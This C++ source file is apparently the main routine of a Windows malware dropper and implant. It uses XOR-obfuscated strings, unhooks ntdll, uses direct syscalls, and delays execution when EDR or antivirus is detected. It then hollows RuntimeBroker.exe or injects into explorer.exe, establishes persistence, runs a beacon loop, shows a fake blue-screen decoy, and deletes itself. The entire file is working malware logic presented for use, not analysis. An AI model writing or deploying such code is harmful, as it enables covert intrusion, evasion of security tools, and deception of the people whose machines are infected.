#include "beacon/Beacon.h"
#include "persistence/Persistence.h"
#include "evasion/Unhooker.h"
#include "evasion/Syscalls.h"
#include "evasion/Injector.h"
#include "evasion/Detection.h"
#include "decoy/BSOD.h"
#include "utils/SelfDelete.h"
#include "utils/Logger.h"
#include "utils/Shared.h"
#include "utils/Obfuscator.h"
#include <windows.h>
#include <objbase.h>
#include <vector>
#include <algorithm>
#include <cwctype>
#include <thread>

namespace {
    // XOR Encrypted Strings (Key 0x5A)
    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
    const wchar_t kSvchostEnc[] = { 's'^0x5A, 'v'^0x5A, 'c'^0x5A, 'h'^0x5A, 'o'^0x5A, 's'^0x5A, 't'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // svchost.exe
    const wchar_t kVolatileEnvEnc[] = { 'V'^0x5A, 'o'^0x5A, 'l'^0x5A, 'a'^0x5A, 't'^0x5A, 'i'^0x5A, 'l'^0x5A, 'e'^0x5A, ' '^0x5A, 'E'^0x5A, 'n'^0x5A, 'v'^0x5A, 'i'^0x5A, 'r'^0x5A, 'o'^0x5A, 'n'^0x5A, 'm'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A }; // Volatile Environment
    const wchar_t kDropperPathEnc[] = { 'D'^0x5A, 'r'^0x5A, 'o'^0x5A, 'p'^0x5A, 'p'^0x5A, 'e'^0x5A, 'r'^0x5A, 'P'^0x5A, 'a'^0x5A, 't'^0x5A, 'h'^0x5A }; // DropperPath
    const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x5A, 'u'^0x5A, 'n'^0x5A, 't'^0x5A, 'i'^0x5A, 'm'^0x5A, 'e'^0x5A, 'B'^0x5A, 'r'^0x5A, 'o'^0x5A, 'k'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // RuntimeBroker.exe

    std::vector<uint8_t> GetSelfImage() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return {};
        DWORD size = GetFileSize(hFile, NULL);
        if (size == INVALID_FILE_SIZE) { CloseHandle(hFile); return {}; }
        std::vector<uint8_t> buffer(size);
        DWORD read;
        ReadFile(hFile, buffer.data(), size, &read, NULL);
        CloseHandle(hFile);
        return buffer;
    }

    bool IsSystemProcess(const std::wstring& sPath) {
        if (sPath.find(utils::DecryptW(kExplorerEnc, 12)) != std::wstring::npos) return true;
        if (sPath.find(utils::DecryptW(kSvchostEnc, 11)) != std::wstring::npos) return true;
        std::wstring rb = utils::DecryptW(kRuntimeBrokerEnc, 17);
        if (sPath.find(rb) != std::wstring::npos) return true;
        return false;
    }

    bool IsRunningFromPersistLocation(const std::wstring& sPath) {
        if (sPath.find(L"\\appdata\\local\\microsoft\\") != std::wstring::npos ||
            sPath.find(L"\\programdata\\microsoft\\") != std::wstring::npos) {
            if (sPath.find(L"\\temp\\") == std::wstring::npos && sPath.find(L"\\tmp\\") == std::wstring::npos) {
                return true;
            }
        }
        return false;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;

    evasion::Unhooker::RefreshNtdll();
    evasion::SyscallResolver::GetInstance();

    wchar_t currentPathBuf[MAX_PATH];
    GetModuleFileNameW(NULL, currentPathBuf, MAX_PATH);
    std::wstring currentPath(currentPathBuf);
    for (auto& c : currentPath) c = (wchar_t)::towlower(c);

    LOG_INFO("--- WINMAIN ---");
    LOG_INFO("Process: " + utils::ws2s(currentPath));

    // EDR/AV Detection and Delay
    int jitter = evasion::Detection::GetJitterDelay();
    if (jitter > 0) {
        LOG_WARN("EDR/AV detected. Sleeping for " + std::to_string(jitter) + "s");
        Sleep(jitter * 1000);
    } else {
        Sleep(10000 + (GetTickCount() % 10000));
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 1;

    if (IsSystemProcess(currentPath)) {
        LOG_INFO("ROLE: Foothold.");
        LOG_INFO("Path matched system process. Initiating persistence and beaconing...");
        wchar_t dropperPath[MAX_PATH] = {0};
        HKEY hKey;
        std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
        std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
        if (RegOpenKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD sz = sizeof(dropperPath);
            if (RegQueryValueExW(hKey, dropPathKey.c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
                Sleep(30000);
                persistence::establishPersistence(dropperPath);
            }
            RegCloseKey(hKey);
        } else {
            // If IPC fails, we still try to reinstall from whatever we can find
            persistence::ReinstallPersistence();
        }
        LOG_INFO("Starting beacon loop...");
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    if (IsRunningFromPersistLocation(currentPath)) {
        LOG_INFO("ROLE: Persisted.");
        beacon::Beacon implant;
        implant.run();
        CoUninitialize();
        return 0;
    }

    // Dropper Instance
    LOG_INFO("ROLE: Dropper.");
    HKEY hKey;
    std::wstring volEnv = utils::DecryptW(kVolatileEnvEnc, 20);
    std::wstring dropPathKey = utils::DecryptW(kDropperPathEnc, 11);
    if (RegCreateKeyExW(HKEY_CURRENT_USER, volEnv.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        if (RegSetValueExW(hKey, dropPathKey.c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
             LOG_INFO("IPC: Stored path successfully.");
        }
        RegCloseKey(hKey);
    }

    std::vector<uint8_t> selfImage = GetSelfImage();
    if (!selfImage.empty()) {
        LOG_INFO("Attempting stealth relocation...");
        wchar_t systemPath[MAX_PATH];
        GetSystemDirectoryW(systemPath, MAX_PATH);
        std::wstring rb = utils::DecryptW(kRuntimeBrokerEnc, 17);
        std::wstring target = std::wstring(systemPath) + L"\\" + rb;

        LOG_INFO("Hollowing target: " + utils::ws2s(target));
        if (evasion::Injector::HollowProcess(target, selfImage)) {
            LOG_INFO("Relocation successful.");
            decoy::ShowBSOD();
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        }

        LOG_WARN("Hollowing failed. Trying explorer.exe injection...");
        if (evasion::Injector::InjectIntoExplorer(selfImage)) {
            LOG_INFO("Injection success. Waiting for foothold...");
            decoy::ShowBSOD();
            LOG_INFO("Decoy exit. Cleaning up dropper.");
            CoUninitialize();
            utils::SelfDeleteAndExit();
            return 0;
        }
    }

    LOG_WARN("Relocation failed completely. Launching stable copy.");
    std::wstring persistPath = persistence::establishPersistence();
    if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
        LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
        STARTUPINFOW si; PROCESS_INFORMATION pi;
        RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        if (CreateProcessW(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            LOG_INFO("Stable copy launched.");
        }
    }

    decoy::ShowBSOD();
    CoUninitialize();
    utils::SelfDeleteAndExit();
    return 0;
}
